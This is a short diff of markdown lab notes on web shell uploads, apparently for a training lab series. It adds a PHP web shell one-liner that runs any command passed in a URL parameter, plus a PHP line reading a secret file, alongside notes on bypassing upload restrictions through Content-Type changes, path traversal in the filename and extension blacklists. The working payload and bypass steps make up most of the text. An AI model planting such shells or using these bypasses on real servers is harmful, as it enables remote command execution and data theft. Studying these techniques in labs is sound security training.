@@ -1,6 +1,7 @@
 **Web shell upload via Content-Type restriction bypass**
-**<?php echo system($_GET["cmd"]); ?>**
-
+```c
+<?php echo system($_GET["cmd"]); ?>
+```
 ```css
 Web shell upload via Content-Type restriction bypass
 Change the content-type to required file and we can upload our shell
@@ -16,4 +17,6 @@ Change the path of the file from filename="exploit.php" To filename="../exploit.
 
 ```
 Web shell upload via extension blacklist bypass
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+
 ```
